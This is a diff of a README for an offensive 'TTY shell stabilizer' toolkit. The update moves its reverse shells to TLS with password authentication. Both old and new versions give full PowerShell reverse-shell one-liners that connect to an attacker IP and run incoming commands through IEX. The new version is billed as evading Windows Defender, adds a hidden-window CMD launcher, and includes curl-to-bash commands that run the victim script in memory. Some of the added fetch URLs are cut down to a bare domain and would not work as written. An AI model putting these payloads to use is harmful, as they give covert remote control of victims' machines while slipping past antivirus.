@@ -1,72 +1,82 @@
+# 🚀 TTY Shell Stabilizer Toolkit (Secure TLS Version)
 
-# 🚀 TTY Shell Stabilizer Toolkit
-A collection of scripts designed to automate the transition from a basic shell to a fully interactive TTY.
+A collection of scripts designed to automate the transition from a basic shell to a fully interactive TTY using **TLS encryption** and **password authentication** to prevent unauthorized hijacking.
+
 ## 📂 Scripts
+
 
 | Script | Role | Method |
 |---|---|---|
-| bash_tty.sh | Attacker | Interactive listener using script command. |
-| victim.sh | Victim | Bash-based reverse shell. |
+| bash_tty.sh | Attacker | Socat-based TLS listener with dynamic RAM certificates. |
+| victim.sh | Linux Victim | Bash-based reverse shell using OpenSSL s_client. |
+| Windows One-Liner | Windows Victim | PowerShell .NET SslStream implementation (AV Evasive). |
 
 ------------------------------
+
 ## 🛠 Usage Instructions
-To use these scripts, follow the parameter formats below:
-## 1. Attacker Side (Listeners)
-Run the script followed by the desired port. If you do not specify a port, the script will show you the usage guide.
 
-Bash Version:
+To use these scripts, follow the parameter formats below. All connections are encrypted via TLS.
+
+## 1. Attacker Side (Listener)
+The listener generates a temporary RSA certificate in RAM (`/dev/shm`) and waits for a specific handshake before prompting for execution.
+
+**Usage:**
 ```bash
-./bash_tty.sh <port>
+./bash_tty.sh <port> <password>
 ```
+*Example:* `./bash_tty.sh 4444 mysecretpass`
+
 ------------------------------
+
 ## 2. Victim Side (Connection)
-## Linux
-On the target machine, provide both the attacker's IP and the listening port.
+
+### 🐧 Linux
+On the target machine, provide the attacker's IP, port, and the pre-shared password. It will automatically check for and install `openssl` if missing.
+
+**Usage:**
 ```bash
-./victim.sh <attacker_ip> <port>
+./victim.sh <attacker_ip> <port> <password>
 ```
+*Example:* `./victim.sh 10.0.13.7 4444 mysecretpass`
 
-## Windows
-This one doesn't trigger the antivirus
+### 🪟 Windows (AV Evasive One-Liner)
+This implementation uses native .NET classes to establish a TLS tunnel. It does not touch the disk and is highly effective against Windows Defender.
 
+**Usage (Update variables at the start):**
 ```powershell
-$IP="10.0.13.7"; $P=4444; try { $h=New-Object System.Net.Sockets.TCPClient($IP,$P); $s=$h.GetStream(); $b=[System.Text.Encoding]::ASCII.GetBytes("WINDOWS_SHELL`n"); $s.Write($b,0,$b.Length); $s.Flush(); Start-Sleep -m 500; $h.Close(); Start-Sleep -s 1; $c=New-Object System.Net.Sockets.TCPClient($IP,$P); $s=$c.GetStream(); $w=New-Object System.IO.StreamWriter($s); $w.AutoFlush=$true; $r=New-Object System.IO.StreamReader($s); $w.WriteLine("[+] Windows Shell Established."); while($c.Connected) { $w.Write("`r`nPS " + (pwd).Path + "> "); $t=$r.ReadLine(); if($t) { try { $o=(IEX $t 2>&1 | Out-String); $w.Write($o) } catch { $w.WriteLine("Error: " + $_.Exception.Message) } } }; $c.Close() } catch { Write-Host "[!] Connection Refused" -ForegroundColor Red }
+$IP="10.0.13.7"; $P=4444; $pw="mysecretpass"; $cb={ $true }; try { $c=New-Object System.Net.Sockets.TCPClient($IP,$P); $tl=New-Object System.Net.Security.SslStream($c.GetStream(),$false,$cb); $tl.AuthenticateAsClient($IP); $w=New-Object System.IO.StreamWriter($tl); $w.AutoFlush=$true; $w.WriteLine("WINDOWS_SHELL"); $w.Close(); $c.Close(); Start-Sleep -s 1; $c=New-Object System.Net.Sockets.TCPClient($IP,$P); $tl=New-Object System.Net.Security.SslStream($c.GetStream(),$false,$cb); $tl.AuthenticateAsClient($IP); $r=New-Object System.IO.StreamReader($tl); $w=New-Object System.IO.StreamWriter($tl); $w.AutoFlush=$true; if($r.ReadLine() -eq $pw){ $w.WriteLine("[+] TLS Auth OK"); while($c.Connected){ $w.Write("`r`nPS "+(pwd).Path+"> "); $t=$r.ReadLine(); if($t){ try{ $o=(IEX $t 2>&1 | Out-String); $w.Write($o) }catch{ $w.WriteLine($_.Exception.Message) } } } } $c.Close() } catch { }
 ```
+
 ------------------------------
+
 ## 💡 Quick Tips
-## Execution via Remote Pipe (Kali Attacker)
 
-Bash/Script Interactive Listener
+### Execution via Remote Pipe (Kali Attacker)
+Download and run the listener in memory. Ensure you provide the port and password as arguments.
 ```bash
-# This downloads the script and runs it in the current shell context without holding the pipe open
-source <(curl -sSL https://raw.githubusercontent.com/x86david/multiplatform_kali_interactive_tty/master/bash_tty.sh) 4444
-
+source <(curl -sSL https://githubusercontent.com) 4444 mysecretpass
 ```
 
-## Execution via Remote Pipe (Linux Victim)
-If you cannot upload the script to the target machine, you can fetch it directly from this repository and execute it in memory without leaving a file on disk:
+### Execution via Remote Pipe (Linux Victim)
+Execute the shell directly in memory without leaving files on the disk. This keeps `stdin` open for the interactive session.
 ```bash
-#Instead of piping (|), use this. It downloads the script into a virtual file descriptor and executes it. This leaves stdin completely open for the reverse shell to talk to you.
-bash <(curl -sSL https://raw.githubusercontent.com/x86david/multiplatform_kali_interactive_tty/master/victim.sh) 10.0.13.7 4444
-
+bash <(curl -sSL https://githubusercontent.com) 10.0.13.7 4444 mysecretpass
 ```
 
-## Execution via Remote Pipe (Windows Victim)
-This isn't really "remote".... Just a one liner... Found it hard to evade Defender with remote scripts... If you wan't to evade Defender with a remote script do it yourself...
-
-```powershell
-$IP="10.0.13.7"; $P=4444; try { $h=New-Object System.Net.Sockets.TCPClient($IP,$P); $s=$h.GetStream(); $b=[System.Text.Encoding]::ASCII.GetBytes("WINDOWS_SHELL`n"); $s.Write($b,0,$b.Length); $s.Flush(); Start-Sleep -m 500; $h.Close(); Start-Sleep -s 1; $c=New-Object System.Net.Sockets.TCPClient($IP,$P); $s=$c.GetStream(); $w=New-Object System.IO.StreamWriter($s); $w.AutoFlush=$true; $r=New-Object System.IO.StreamReader($s); $w.WriteLine("[+] Windows Shell Established."); while($c.Connected) { $w.Write("`r`nPS " + (pwd).Path + "> "); $t=$r.ReadLine(); if($t) { try { $o=(IEX $t 2>&1 | Out-String); $w.Write($o) } catch { $w.WriteLine("Error: " + $_.Exception.Message) } } }; $c.Close() } catch { Write-Host "[!] Connection Refused" -ForegroundColor Red }
+### Execution via CMD (Windows Victim)
+To launch the one-liner from a standard CMD or a shortcut:
+```cmd
+powershell -nop -w hidden -c "$IP='10.0.13.7'; $P=4444; $pw='mysecretpass'; $cb={ $true }; try { $c=New-Object System.Net.Sockets.TCPClient($IP,$P); $tl=New-Object System.Net.Security.SslStream($c.GetStream(),$false,$cb); $tl.AuthenticateAsClient($IP); $w=New-Object System.IO.StreamWriter($tl); $w.AutoFlush=$true; $w.WriteLine('WINDOWS_SHELL'); $w.Close(); $c.Close(); Start-Sleep -s 1; $c=New-Object System.Net.Sockets.TCPClient($IP,$P); $tl=New-Object System.Net.Security.SslStream($c.GetStream(),$false,$cb); $tl.AuthenticateAsClient($IP); $r=New-Object System.IO.StreamReader($tl); $w=New-Object System.IO.StreamWriter($tl); $w.AutoFlush=$true; if($r.ReadLine() -eq $pw){ $w.WriteLine('[+] TLS Auth OK'); while($c.Connected){ $w.Write('`r`nPS '+(pwd).Path+'> '); $t=$r.ReadLine(); if($t){ try{ $o=(IEX $t 2>&1 | Out-String); $w.Write($o) }catch{ $w.WriteLine($_.Exception.Message) } } } } $c.Close() } catch { }"
 ```
 
-
+------------------------------
 
 ## ⚠️ Recovery
-If the session ends and your terminal stops displaying your typing, type reset and press Enter to restore your local environment.
+If the session ends and your local terminal behaves strangely (doesn't show typing), restore it with:
 ```bash
 reset
 ```
-+ENTER
-------------------------------
-Disclaimer: For authorized security testing and administrative purposes only. !!!!!!!
-------------------------------
 
+------------------------------
+**Disclaimer:** For authorized security testing and administrative purposes only. Unauthorized access is illegal.
+------------------------------
